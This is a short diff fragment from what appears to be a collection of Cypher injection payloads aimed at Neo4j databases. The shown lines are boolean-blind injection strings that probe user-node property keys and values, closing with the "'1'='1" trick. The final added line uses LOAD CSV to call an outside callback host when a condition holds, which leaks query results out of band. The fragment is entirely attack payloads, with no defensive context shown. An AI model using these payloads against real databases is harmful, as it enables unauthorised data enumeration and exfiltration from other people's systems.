@@ -64,3 +64,7 @@ and exists {MATCH (t:user) where size(keys(t)[0]) = 8 return keys(t)}
 and count {MATCH (t:user) unwind keys(t) as key with key, t where key = 'username' return t[key]} = 2
 
 and exists {MATCH (t:user) unwind keys(t) as key with key, t  where key = 'username' with t,key skip 0 limit 1 where size(toString(t[key])) > 0 return t[key]}
+
+and exists { call {match(t:user) call db.propertyKeys() yield propertyKey with propertyKey where not isEmpty(t[propertyKey]) with distinct propertyKey return propertyKey } with propertyKey skip 1 limit 1 return propertyKey} and 2=2 and case when 2 = 2 then true else false end  and '1'='1
+
+and case when count { call {match(t:user) call db.propertyKeys() yield propertyKey with propertyKey where not isEmpty(t[propertyKey]) with distinct propertyKey return propertyKey } with propertyKey return propertyKey} = 1 then exists {load csv from 'http://28357ad847461b9ded7fe68df351b98eaaa.test.com/' as csv_test} else false end and '1'='1
